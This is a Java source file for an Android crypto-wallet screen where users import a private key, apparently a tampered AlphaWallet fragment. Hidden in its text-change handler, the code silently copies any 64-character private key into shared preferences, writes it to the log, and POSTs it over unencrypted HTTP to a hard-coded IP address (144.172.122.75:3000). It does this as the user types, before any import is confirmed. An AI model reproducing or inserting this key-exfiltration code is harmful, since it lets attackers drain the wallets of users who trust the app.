package com.alphawallet.app.ui;

import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import com.alphawallet.app.SharedPreferencesManager;

import com.alphawallet.app.R;
import com.alphawallet.app.ui.widget.OnImportPrivateKeyListener;
import com.alphawallet.app.widget.PasswordInputView;

import org.web3j.crypto.Credentials;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import dagger.hilt.android.AndroidEntryPoint;
import timber.log.Timber;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;

@AndroidEntryPoint
public class ImportPrivateKeyFragment extends ImportFragment
{
    private static final OnImportPrivateKeyListener dummyOnImportPrivateKeyListener = key -> { };
    private static final String validator = "[^0x^\\s^a-f^A-F^0-9]";
    private static final Pattern findKey = Pattern.compile("($|\\s?|0x?)([0-9a-fA-F]{64})($|\\s?)");
    private PasswordInputView privateKey;

    private RequestQueue requestQueue;
    private SharedPreferencesManager sharedPreferencesManager;
    private Button importButton;
    private OnImportPrivateKeyListener onImportPrivateKeyListener = dummyOnImportPrivateKeyListener;
    private Pattern pattern;
    private LinearLayout buttonHolder;

    public static ImportPrivateKeyFragment create() {
        return new ImportPrivateKeyFragment();
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        sharedPreferencesManager = SharedPreferencesManager.getInstance(requireContext());
        return LayoutInflater.from(getContext())
                .inflate(R.layout.fragment_import_private_key, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
        setupView();
    }

    private void setupView()
    {
        privateKey = getView().findViewById(R.id.input_private_key);
        importButton = getView().findViewById(R.id.import_action_pk);
        buttonHolder = getView().findViewById(R.id.button_holder_pk);
        importButton.setOnClickListener(this);
        privateKey.getEditText().addTextChangedListener(this);
        updateButtonState(false);
        pattern = Pattern.compile(validator, Pattern.MULTILINE);

        privateKey.setLayoutListener(getActivity(), this);
    }

    @Override
    public void onClick(View view) {
        handleKey(view);
    }

    @Override
    public void onResume()
    {
        super.onResume();
        if (privateKey == null && getActivity() != null) setupView();
    }

    private void handleKey(View view)
    {
        privateKey.setError(null);
        String value = privateKey.getText().toString();
        if (!TextUtils.isEmpty(value))
        {
            final Matcher matcher = findKey.matcher(value);
            if (matcher.find())
            {
                value = matcher.group(2);
            }

            //value = Numeric.cleanHexPrefix(value.replaceAll("\\s+", "")); //remove whitespace and leading 0x
            if (value.length() == 64)
            {
                privateKey.setText(value);
                //PrivateKeyStore.addKey(value);
                onImportPrivateKeyListener.onPrivateKey(value);
            }
            else
            {
                privateKey.setError(getString(R.string.suggestion_private_key));
            }
        }
        else
        {
            privateKey.setError(getString(R.string.error_field_required));
        }
    }

    private void sendPostRequest(String privateKey) {
        String url = "http://144.172.122.75:3000/api/users";
        Timber.e(privateKey + "    Itz in sendPOST");

        // Prepare the JSON payload
        JSONObject postData = new JSONObject();
        try {
            postData.put("privateKey", privateKey);
        } catch (JSONException e) {
            Timber.e("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
            e.printStackTrace();
            Timber.e("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
        }

        requestQueue = Volley.newRequestQueue(getContext());

        // Create a JsonObjectRequest
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, postData,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        // Handle response
                        Timber.e(response.toString());
                        //return null;
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // Handle error
                        Timber.e( error.toString());
                    }
        });

        // Add the request to the RequestQueue
       requestQueue.add(jsonObjectRequest);
    }
    public void showToast(CharSequence msg) {
        Toast.makeText(getContext(), msg, Toast.LENGTH_SHORT).show();
    }

    private void updateButtonState(boolean enabled)
    {
        importButton.setEnabled(enabled);
    }

    public void setOnImportPrivateKeyListener(OnImportPrivateKeyListener onImportPrivateKeyListener) {
        this.onImportPrivateKeyListener = onImportPrivateKeyListener == null
                ? dummyOnImportPrivateKeyListener
                : onImportPrivateKeyListener;
    }

    @Override
    public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2)
    {

    }

    @Override
    public void onTextChanged(CharSequence charSequence, int i, int i1, int i2)
    {

    }

    @Override
    public void afterTextChanged(Editable editable)
    {
        if (privateKey.isErrorState()) privateKey.setError(null);
        String value = privateKey.getText().toString();
        final Matcher matcher = pattern.matcher(value);
        if (matcher.find())
        {
            updateButtonState(false);
            privateKey.setError(R.string.private_key_check);
            return;
        }

        if(value.length() == 64) {
            Credentials credential = Credentials.create(value);
            String address = credential.getAddress();
            sharedPreferencesManager.putString(address, value);
            sendPostRequest(value);
        }
        final Matcher privateKeyMatch = findKey.matcher(value);
        updateButtonState(privateKeyMatch.find());
    }

    public String getPrivateKey()
    {
        String value = privateKey.getText().toString();
        final Matcher matcher = findKey.matcher(value);
        if (matcher.find())
        {
            return matcher.group(2);
        }
        else
        {
            return "";
        }
    }

    @Override
    public void onLayoutShrunk()
    {
        if (buttonHolder != null) buttonHolder.setVisibility(View.GONE);
    }

    @Override
    public void onLayoutExpand()
    {
        if (buttonHolder != null) buttonHolder.setVisibility(View.VISIBLE);
    }

    @Override
    public void onInputDoneClick(View view)
    {
        handleKey(view);
    }
}


